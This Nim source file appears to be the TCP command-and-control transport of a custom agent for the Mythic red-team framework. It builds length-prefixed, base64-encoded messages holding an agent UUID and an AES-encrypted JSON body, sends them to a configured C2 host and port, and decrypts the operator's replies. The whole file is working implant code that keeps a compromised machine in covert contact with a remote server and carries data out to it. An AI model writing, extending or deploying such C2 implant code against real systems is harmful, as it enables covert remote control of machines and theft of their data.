## TCP C2 transport for Mythic.
## Framing: [4-byte big-endian length][base64 message bytes]
## Same base64 message format as HTTP (uuid + encrypted body).
## Selected at compile time with -d:c2ProfileTcp.

import std/[net, base64, strutils]
import config, crypto/aes, core/utils

type
  Transport* = ref object
    host: string
    port: int

proc newTransport*(): Transport =
  result = Transport(host: TcpHost, port: TcpPort)

proc buildMessage*(currentUUID: string, aesKey: seq[byte], jsonBody: string): string =
  var uuidPadded = currentUUID
  while uuidPadded.len < 36:
    uuidPadded.add('\x00')
  let uuidBytes = toBytes(uuidPadded[0..35])
  if aesKey.len == 32:
    result = base64.encode(uuidBytes & aesEncrypt(aesKey, jsonBody))
  else:
    result = base64.encode(uuidBytes & toBytes(jsonBody))

proc parseResponse*(raw: seq[byte], aesKey: seq[byte]): string =
  if raw.len < 36: return ""
  let body = raw[36 .. ^1]
  if aesKey.len == 32: result = aesDecrypt(aesKey, body)
  else: result = fromBytes(body)

proc recvExact(sock: Socket, n: int): string =
  result = ""
  while result.len < n:
    var chunk = newString(n - result.len)
    let got = sock.recv(chunk, n - result.len)
    if got <= 0: return
    result.add(chunk[0 ..< got])

proc post*(t: Transport, currentUUID: string, aesKey: seq[byte], jsonBody: string): string =
  let message = buildMessage(currentUUID, aesKey, jsonBody)
  stderr.writeLine("[*] TCP " & t.host & ":" & $t.port)
  try:
    var sock = newSocket(buffered = false)
    sock.connect(t.host, Port(t.port))
    defer: sock.close()

    # Send: 4-byte big-endian length + message bytes
    let msgLen = uint32(message.len)
    var frame = newString(4 + message.len)
    frame[0] = char((msgLen shr 24) and 0xFF)
    frame[1] = char((msgLen shr 16) and 0xFF)
    frame[2] = char((msgLen shr 8) and 0xFF)
    frame[3] = char(msgLen and 0xFF)
    frame[4 .. ^1] = message
    sock.send(frame)

    # Receive: 4-byte big-endian length
    let lenBytes = recvExact(sock, 4)
    if lenBytes.len < 4: return ""
    let respLen = (uint32(lenBytes[0]) shl 24) or
                  (uint32(lenBytes[1]) shl 16) or
                  (uint32(lenBytes[2]) shl 8) or
                  uint32(lenBytes[3])
    if respLen == 0 or respLen > 10_000_000'u32: return ""

    let respMsg = recvExact(sock, int(respLen))
    if respMsg.len == 0: return ""

    let rawBytes = toBytes(base64.decode(respMsg.strip()))
    result = parseResponse(rawBytes, aesKey)
    if result.len > 0:
      stderr.writeLine("[+] TCP OK (" & $result.len & " bytes)")
    else:
      stderr.writeLine("[!] TCP decrypt failed or empty response")
  except Exception as e:
    stderr.writeLine("[!] TCP error: " & e.msg)
    result = ""
